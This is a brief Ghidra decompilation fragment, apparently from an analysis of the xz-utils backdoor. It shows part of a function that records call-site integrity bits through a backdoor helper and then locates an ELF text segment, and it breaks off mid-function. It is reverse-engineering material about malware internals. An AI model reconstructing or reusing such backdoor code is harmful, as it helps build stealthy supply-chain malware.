// /home/kali/xzre-ghidra/xzregh/101F70_elf_get_rodata_segment_after_text.c
// Function: elf_get_rodata_segment_after_text @ 0x101F70
// Calling convention: __stdcall
// Prototype: void * __stdcall elf_get_rodata_segment_after_text(elf_info_t * elf_info, u64 * pSize)
...
void * elf_get_rodata_segment_after_text(elf_info_t *elf_info,u64 *pSize)

{
  ...
  telemetry_ok = secret_data_append_bits_from_call_site((secret_data_shift_cursor_t)0xbd,0xe,0xb,FALSE);
  if (telemetry_ok != FALSE) {
    ...
    segment_start_ptr = elf_get_text_segment(elf_info,&code_segment_size);
    if (segment_start_ptr != (void *)0x0) {
